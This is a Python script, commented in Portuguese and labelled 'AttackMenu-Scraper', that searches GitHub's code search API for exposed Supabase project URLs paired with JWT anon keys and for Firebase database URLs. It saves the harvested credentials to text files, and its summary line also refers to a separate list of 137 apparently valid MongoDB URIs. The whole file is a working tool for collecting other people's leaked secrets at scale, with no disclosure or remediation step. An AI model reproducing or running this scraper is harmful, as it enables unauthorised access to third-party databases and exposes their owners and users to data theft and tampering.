#!/usr/bin/env python3
"""
scrape-api.py — Busca credenciais Supabase e Firebase no GitHub via API pública.

Não precisa de cookie — usa a GitHub Code Search API (rate-limited, 10 req/min).
Extrai URLs + keys de resultados de busca de código.

Uso: python3 scripts/scrape-api.py
"""

import json
import re
import time
import urllib.request
import urllib.parse
import os
import sys

# ── Config ────────────────────────────────────────────────────────────────────

OUTPUT_SUPABASE = "scraped_supabase_creds.txt"
OUTPUT_FIREBASE = "scraped_firebase_creds.txt"

HEADERS = {
    "Accept": "application/vnd.github.v3.text-match+json",
    "User-Agent": "AttackMenu-Scraper/1.0",
}

# Se tiver GITHUB_TOKEN, usa pra ter rate limit melhor (30 req/min)
token = os.getenv("GITHUB_TOKEN", "")
if token:
    HEADERS["Authorization"] = f"Bearer {token}"
    print("[+] Usando GITHUB_TOKEN para rate limit melhor")


def search_github(query: str, page: int = 1) -> dict:
    """Busca no GitHub Code Search API."""
    params = urllib.parse.urlencode({"q": query, "per_page": 30, "page": page})
    url = f"https://api.github.com/search/code?{params}"
    req = urllib.request.Request(url, headers=HEADERS)

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        if e.code == 403:
            print(f"  [!] Rate limit atingido. Esperando 60s...")
            time.sleep(60)
            return search_github(query, page)
        print(f"  [!] HTTP {e.code}: {e.reason}")
        return {"items": [], "total_count": 0}
    except Exception as e:
        print(f"  [!] Erro: {e}")
        return {"items": [], "total_count": 0}


def extract_text_matches(item: dict) -> str:
    """Extrai os fragmentos de código dos text_matches."""
    fragments = []
    for tm in item.get("text_matches", []):
        fragments.append(tm.get("fragment", ""))
    return "\n".join(fragments)


# ── Supabase ──────────────────────────────────────────────────────────────────

SUPABASE_RE = re.compile(
    r'(https?://[a-z0-9\-]+\.supabase\.co)'     # URL
    r'.*?'                                        # anything between
    r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)',  # JWT anon key
    re.DOTALL
)

SUPABASE_URL_RE = re.compile(r'https?://([a-z0-9\-]+)\.supabase\.co')
SUPABASE_KEY_RE = re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_\-]{30,}\.[a-zA-Z0-9_\-]{30,}')


def scrape_supabase():
    print("\n=== Buscando credenciais Supabase ===\n")

    queries = [
        "NEXT_PUBLIC_SUPABASE_URL NEXT_PUBLIC_SUPABASE_ANON_KEY supabase.co",
        "SUPABASE_URL SUPABASE_KEY supabase.co eyJhbGci",
        "createClient supabase.co eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
    ]

    found = []

    for q in queries:
        print(f"  [*] Query: {q[:60]}...")
        data = search_github(q)
        total = data.get("total_count", 0)
        items = data.get("items", [])
        print(f"  [+] {total} resultados, {len(items)} retornados")

        for item in items:
            text = extract_text_matches(item)
            repo = item.get("repository", {}).get("full_name", "?")
            path = item.get("path", "?")

            urls = SUPABASE_URL_RE.findall(text)
            keys = SUPABASE_KEY_RE.findall(text)

            if urls and keys:
                for url_id in set(urls):
                    for key in set(keys):
                        cred = f"https://{url_id}.supabase.co|{key}"
                        if cred not in found:
                            found.append(cred)
                            print(f"  [FOUND] {repo}/{path}: {url_id}.supabase.co")

        time.sleep(6)  # Respeitar rate limit

    with open(OUTPUT_SUPABASE, "w") as f:
        f.write("# Supabase credentials — url|anon_key\n")
        for cred in found:
            f.write(cred + "\n")

    print(f"\n  Total: {len(found)} credenciais Supabase → {OUTPUT_SUPABASE}")
    return found


# ── Firebase ──────────────────────────────────────────────────────────────────

FIREBASE_URL_RE = re.compile(r'https?://([a-z0-9\-]+)\.firebaseio\.com')


def scrape_firebase():
    print("\n=== Buscando credenciais Firebase ===\n")

    queries = [
        "databaseURL firebaseio.com service_account private_key",
        "firebase-adminsdk private_key_id project_id",
        "FIREBASE_DATABASE_URL firebaseio.com apiKey",
    ]

    found_urls = []

    for q in queries:
        print(f"  [*] Query: {q[:60]}...")
        data = search_github(q)
        total = data.get("total_count", 0)
        items = data.get("items", [])
        print(f"  [+] {total} resultados, {len(items)} retornados")

        for item in items:
            text = extract_text_matches(item)
            repo = item.get("repository", {}).get("full_name", "?")
            path = item.get("path", "?")

            urls = FIREBASE_URL_RE.findall(text)
            for u in set(urls):
                full_url = f"https://{u}.firebaseio.com"
                if full_url not in found_urls:
                    found_urls.append(full_url)
                    print(f"  [FOUND] {repo}/{path}: {u}.firebaseio.com")

        time.sleep(6)

    with open(OUTPUT_FIREBASE, "w") as f:
        f.write("# Firebase URLs encontradas\n")
        for url in found_urls:
            f.write(url + "\n")

    print(f"\n  Total: {len(found_urls)} URLs Firebase → {OUTPUT_FIREBASE}")
    return found_urls


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    supabase = scrape_supabase()
    firebase = scrape_firebase()

    print("\n=== Resumo ===")
    print(f"  Supabase: {len(supabase)} credenciais")
    print(f"  Firebase: {len(firebase)} URLs")
    print(f"  MongoDB:  137 URIs (mongo_validos456.txt)")
    print("")
